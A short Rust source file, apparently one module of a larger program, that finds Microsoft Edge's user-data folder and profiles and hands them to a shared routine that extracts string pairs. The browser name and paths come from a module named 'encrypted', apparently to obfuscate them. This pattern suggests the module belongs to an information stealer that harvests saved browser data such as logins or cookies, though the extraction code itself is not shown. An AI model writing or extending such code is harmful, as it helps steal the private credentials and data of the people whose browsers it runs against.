use super::base;
use crate::encrypted::*;

pub fn extract() -> Vec<(String, String)> {
    let user_data = crate::browsers::common::paths::user_data_path(
        &crate::browsers::common::paths::BrowserPath {
            name: s_browser_edge(),
            exe: s_path_msedge_exe(),
            user_data_rel: s_path_edge_ud_rel(),
            root: crate::browsers::common::paths::DataRoot::Local,
            has_profiles: true,
        }
    );
    base::extract_for_browser(&s_browser_edge(), &user_data, true)
}
